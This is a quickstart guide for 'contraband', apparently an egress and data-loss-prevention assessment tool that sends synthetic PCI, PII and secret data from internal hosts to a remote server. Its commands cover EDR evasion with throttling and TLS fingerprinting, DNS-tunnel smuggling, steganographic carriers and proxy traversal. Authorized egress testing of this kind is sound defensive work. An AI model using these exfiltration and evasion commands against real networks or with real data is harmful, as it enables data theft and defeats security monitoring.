# Quickstart Guide

This guide walks through setting up an assessment infrastructure in 30 seconds using either the unified `contraband` command or standalone binaries.

---

## 1. Start the Reflection & Command Center Server

Run the server on your staging or egress listener host.

```bash
# Unified binary syntax
contraband server \
  --live-dashboard :8080 \
  --bind 0.0.0.0 \
  --ports quick \
  --protocols all \
  --save-payload \
  --evidence-dir evidence

# Standalone binary syntax
contraband-server \
  --dashboard :8080 \
  --bind 0.0.0.0 \
  --ports quick \
  --protocols all
```

This command launches the live web dashboard on port 8080 (accessible via `/dashboard`), initiates dedicated L7 listeners (HTTP/1.1, HTTP/2, HTTP/3, WebSockets, WebDAV, gRPC, DNS, FTP, SFTP, SMTP, SMB), and starts the userspace port reflection demultiplexer across the configured port matrix.

---

## 2. Execute Client Egress Assessment

On the client workstation or target internal host:

```bash
# Standard assessment against staging server
contraband client \
  --server 198.51.100.1 \
  --ports quick \
  --protocols web \
  --dlp pci \
  --throughput 1MB/s \
  --sync-report http://198.51.100.1:8080 \
  --output-html report.html \
  --output-json report.json

# Standalone client syntax
contraband-client \
  --server 198.51.100.1 \
  --ports 80,443,8443 \
  --dlp secrets \
  --carrier-type json \
  --sync-report http://198.51.100.1:8080
```

---

## 3. Autonomous 7-Stage Pipeline

When executed, the client automatically navigates seven consecutive assessment phases:

```
[+] Stage 1: L4 Port Sweep              - Concurrency-bounded SYN/Connect sweep across target ports
[+] Stage 2: Proxy Traversal Check      - Auto-evaluates Direct, PAC, and Authenticated proxy paths
[+] Stage 3: Covert Shaping & Jitter    - Token bucket rate-limiter and cadence pacing engine
[+] Stage 4: Synthetic DLP Generation   - In-memory generation of mathematically valid test secrets
[+] Stage 5: Evasion & Stego Pipeline   - Encoding, compression, encryption, and carrier wrapping
[+] Stage 6: Multi-Protocol Smuggling   - Parallel chunk transfer and server verification handshakes
[+] Stage 7: EEI Scoring & Sync         - Calculates Egress Exposure Index, exports SARIF/HTML, syncs to HUD
```

---

## 4. Multi-Zone Distributed Execution

To monitor multiple network zones simultaneously in the Command Center:

```bash
# Client in Corporate HQ
contraband-client -s 198.51.100.1 --zone "HQ-Workstations" --sync-report http://198.51.100.1:8080

# Client in Branch Office
contraband-client -s 198.51.100.1 --zone "Branch-Offices" --sync-report http://198.51.100.1:8080

# Client in AWS VPC
contraband-client -s 198.51.100.1 --zone "Cloud-VPC-Production" --sync-report http://198.51.100.1:8080
```

The Command Center aggregates telemetry from all zones in real-time, displays comparative EEI scores, and logs zone-specific security findings.

---

## 5. Assessment Scenarios by Environment

### Stealth & Low-and-Slow EDR Evasion
Throttle exfiltration rate to 100 KB/s with randomized inter-packet jitter (2s–10s), Chrome TLS fingerprinting, and AES-256-GCM + Zstandard transform chaining:

```bash
contraband client \
  --server 198.51.100.1 \
  --protocols https_post,dns_over_https \
  --cadence low-and-slow \
  --throughput 100KB/s \
  --interval-min 2s \
  --interval-max 10s \
  --tls-fingerprint chrome \
  --transforms aes_gcm,zstd,base64 \
  --passphrase "AssessmentSecretKey2026!"
```

### High-Throughput QUIC & UDP Deep Packet Inspection
Paces a 2 MB DLP payload at a steady 1 MB/s across discrete 64 KB chunks to evaluate NGFW deep-packet inspection over modern UDP-based HTTP/3 and SMB-over-QUIC listeners:

```bash
contraband client \
  --server 198.51.100.1 \
  --protocols http3_quic,smb_quic \
  --size 2MB \
  --rate 1MB/s \
  --chunk-size 64KB \
  --cadence steady \
  --sync-report http://198.51.100.1:8080
```

### Corporate Proxy Traversal (NTLM / Negotiate / WPAD)
Auto-detects WinHTTP/WPAD proxy configurations or routes through an explicit corporate forward proxy with NTLM authentication and HTTP/2 multiplexing:

```bash
contraband client \
  --server 198.51.100.1 \
  --proxy "http://corp-proxy.internal:8080" \
  --proxy-auth ntlm \
  --protocols http_post,https_post,websocket \
  --ports 80,443,8080,8443
```

### Restricted & Air-Gapped Egress (DNS-Only Smuggling)
When all outbound direct TCP egress is blocked and only recursive internal DNS resolvers are reachable, tunnels chunked payloads over authoritative DNS TXT and A queries:

```bash
contraband client \
  --server tunnel.egress.example.com \
  --protocols dns_txt,dns_a \
  --size 500KB \
  --chunk-size 64KB \
  --rate 50KB/s
```

### Steganographic Carrier Smuggling (Deep File / DPI Bypass)
Embeds encrypted synthetic PCI/PII records into the least significant bits (LSB) of PNG/BMP pixel matrices or polyglot files to bypass content-disarm and deep file inspection:

```bash
contraband client \
  --server 198.51.100.1 \
  --protocols https_post \
  --stego png \
  --carrier-type json \
  --dlp pci,pii \
  --transforms aes_gcm
```

### Enterprise Multi-Zone Segmentation Audit
Tags outbound telemetry with network segment identifiers (`pci-enclave`, `dmz`, `workstations`) to isolate cross-segmentation leakage and aggregate zone comparisons on the centralized dashboard:

```bash
contraband client \
  --server 198.51.100.1 \
  --zone "pci-enclave" \
  --ports standard \
  --protocols web,file,cloud \
  --dlp pci \
  --sync-report http://198.51.100.1:8080
```

### Pre-Flight Safety Dry Run (Zero Sockets, Zero Wire Traffic)
Validates target DNS reachability, port presets, and protocol handlers while confirming the <32 MB heap invariant without transmitting packets over the network:

```bash
contraband client \
  --server 198.51.100.1 \
  --protocols all \
  --dry-run
```
